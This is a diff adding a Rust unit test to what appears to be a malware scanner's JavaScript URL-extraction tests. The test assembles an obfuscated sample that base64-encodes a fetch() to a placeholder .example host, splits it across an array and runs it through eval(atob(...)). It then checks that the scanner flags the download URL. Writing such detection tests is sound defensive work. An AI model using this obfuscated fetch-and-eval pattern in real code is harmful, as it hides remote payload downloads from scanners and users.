@@ -10356,6 +10356,33 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_array_reverse_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-reverse-slice-join-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js = format!(
+            r#"var a = ["noise", "{right}", "{left}"]; eval(atob(a.reverse().slice(0, 2).join("")))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-reverse-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array reverse/slice/join payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_concat_arg_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
